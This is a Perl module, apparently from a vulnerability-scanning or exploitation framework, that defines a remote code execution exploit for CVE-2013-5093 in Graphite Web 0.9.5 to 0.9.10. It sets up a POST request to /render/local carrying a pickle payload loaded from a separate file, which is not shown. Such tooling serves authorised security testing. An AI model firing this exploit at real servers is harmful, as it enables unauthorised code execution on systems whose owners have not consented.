package GRAPHITE::MSF::GraphitePickleExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "GraphitePickleExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2013-5093",
  DESCRIPTION => "

        This module exploits a remote code execution vulnerability in the pickle

        handling of the rendering code in the Graphite Web project between version

        0.9.5 and 0.9.10 (both included).

      ",
  MSF_MODULE => "graphite_pickle_exec",
  PATHS => [""],
  REFERENCES => [
    "http://ceriksen.com/2013/08/20/graphite-remote-code-execution-vulnerability-advisory/",
  ],
  TITLE => "Graphite Web Unsafe Pickle Handling",
  VARIABLES => {
    'PATH' =>       { DESCRIPTION => "The path to a vulnerable application", VALUE => "/" },
  },

  TYPE => 'MSF',
  PLATFORM => 'UNIX',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'render/local',
      PAYLOAD      => read_file('MSFExploits/GRAPHITE/MSF/src/GraphitePickleExec.payload', 1),
      TEXT   => 'Sending Exploit #1 Request : [POST] /render/local',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
